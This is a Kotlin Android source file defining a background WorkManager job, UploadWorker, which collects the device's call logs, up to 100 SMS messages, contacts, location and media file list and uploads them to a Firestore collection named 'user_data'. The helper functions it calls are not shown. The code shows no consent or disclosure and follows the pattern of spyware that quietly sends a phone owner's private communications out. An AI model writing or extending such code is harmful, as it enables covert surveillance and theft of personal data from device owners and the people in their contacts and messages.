package com.example.myapplication3

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.firebase.firestore.FirebaseFirestore

class UploadWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    override fun doWork(): Result {
        try {
            val callLogs = getCallLogs(applicationContext)
            val smsLogs = getSMSLogs(applicationContext, limit = 100) // Limit SMS logs to 100
            val contacts = getContacts(applicationContext)
            val location = getLocation(applicationContext)
            val mediaFiles = getMediaFiles(applicationContext)

            // Upload data to Firebase
            uploadDataToFirebase(callLogs, smsLogs, contacts, location, mediaFiles)

            return Result.success()
        } catch (e: Exception) {
            Log.e("UploadWorker", "Error uploading data", e)
            return Result.failure()
        }
    }

    private fun uploadDataToFirebase(callLogs: String, smsLogs: String, contacts: String, location: String, mediaFiles: List<String>) {
        val db = FirebaseFirestore.getInstance()

        val data = hashMapOf(
            "callLogs" to callLogs,
            "smsLogs" to smsLogs,  // Subset of SMS logs
            "contacts" to contacts,
            "location" to location,
            "mediaFiles" to mediaFiles
        )

        db.collection("user_data")
            .add(data)
            .addOnSuccessListener { documentReference ->
                Log.d("UploadWorker", "DocumentSnapshot added with ID: ${documentReference.id}")
            }
            .addOnFailureListener { e ->
                Log.w("UploadWorker", "Error adding document", e)
            }
    }
}
